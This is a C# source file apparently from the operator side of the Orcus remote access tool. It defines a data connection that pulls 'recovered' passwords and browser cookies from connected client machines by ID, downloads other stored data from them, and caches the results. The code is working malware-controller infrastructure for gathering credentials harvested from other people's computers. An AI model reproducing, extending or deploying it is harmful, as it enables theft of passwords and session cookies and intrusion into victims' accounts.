using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Orcus.Administration.Plugins.DataManager;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;

namespace Orcus.Administration.Core.DataManagement
{
    public class DataConnection : IDataConnection
    {
        private readonly ConnectionManager _connectionManager;
        private readonly Dictionary<DataEntry, Tuple<byte[], DateTime>> _cachedData;
        private readonly Dictionary<DataEntry, Tuple<PasswordData, DateTime>> _cachedPasswords;

        public DataConnection(ConnectionManager connectionManager)
        {
            _connectionManager = connectionManager;
            _cachedData = new Dictionary<DataEntry, Tuple<byte[], DateTime>>();
            _cachedPasswords = new Dictionary<DataEntry, Tuple<PasswordData, DateTime>>();
        }

        public async Task<PasswordData> DownloadPasswordData(List<DataEntry> dataEntries)
        {
            var passwordData = new PasswordData {Passwords = new List<RecoveredPassword>(), Cookies = new List<RecoveredCookie>()};
            foreach (var dataEntry in dataEntries)
            {
                Tuple<PasswordData, DateTime> itemData;
                if (_cachedPasswords.TryGetValue(dataEntry, out itemData))
                {
                    _cachedPasswords[dataEntry] = new Tuple<PasswordData, DateTime>(itemData.Item1, DateTime.Now);
                    passwordData.Passwords.AddRange(itemData.Item1.Passwords);
                    passwordData.Cookies.AddRange(itemData.Item1.Cookies);
                    continue;
                }

                var clientPasswordData =
                    await
                        Task.Run(
                            () => _connectionManager.GetPasswords(new BaseClientInformation {Id = dataEntry.ClientId}));
                passwordData.Passwords.AddRange(clientPasswordData.Passwords);
                passwordData.Cookies.AddRange(clientPasswordData.Cookies);
                _cachedPasswords.Add(dataEntry, new Tuple<PasswordData, DateTime>(clientPasswordData, DateTime.Now));
            }

            CheckData();
            return passwordData;
        }

        public async Task<byte[]> DownloadEntry(DataEntry dataEntry)
        {
            Tuple<byte[], DateTime> result;
            if (_cachedData.TryGetValue(dataEntry, out result))
            {
                _cachedData[dataEntry] = new Tuple<byte[], DateTime>(result.Item1, DateTime.Now);
                return result.Item1;
            }

            var data = await Task.Run(() => _connectionManager.DataTransferProtocolFactory.ExecuteFunction<byte[]>("DownloadData", dataEntry.Id));
            if (data == null)
                return null;
            _cachedData.Add(dataEntry, new Tuple<byte[], DateTime>(data, DateTime.Now));
            CheckData();
            return data;
        }

        public async Task<Dictionary<DataEntry, byte[]>> DownloadEntries(IEnumerable<DataEntry> dataEntries)
        {
            var entriesToDownload = new List<DataEntry>();
            var result = new Dictionary<DataEntry, byte[]>();
            foreach (var dataEntry in dataEntries)
            {
                Tuple<byte[], DateTime> item;
                if (_cachedData.TryGetValue(dataEntry, out item))
                {
                    _cachedData[dataEntry] = new Tuple<byte[], DateTime>(item.Item1, DateTime.Now);
                    result.Add(dataEntry, item.Item1);
                }
                else
                    entriesToDownload.Add(dataEntry);
            }
            if (entriesToDownload.Count > 0)
            {
                var downloadedData =
                    await
                        Task.Run(
                            () =>
                                _connectionManager.DataTransferProtocolFactory.ExecuteFunction<List<byte[]>>(
                                    "DownloadMultipleData", entriesToDownload.Select(x => x.Id).ToList()));
                for (int i = 0; i < entriesToDownload.Count; i++)
                {
                    result.Add(entriesToDownload[i], downloadedData[i]);
                    _cachedData.Add(entriesToDownload[i], new Tuple<byte[], DateTime>(downloadedData[i], DateTime.Now));
                }
            }
            CheckData();
            return result;
        }

        private void CheckData()
        {
            while (_cachedData.Sum(x => x.Value.Item1.Length) > 1024*1024*5)
            {
                _cachedData.Remove(_cachedData.OrderBy(x => x.Value.Item2).First().Key);
            }

            while (_cachedPasswords.Count > 10)
            {
                _cachedPasswords.Remove(_cachedPasswords.OrderBy(x => x.Value.Item2).First().Key);
            }
        }
    }
}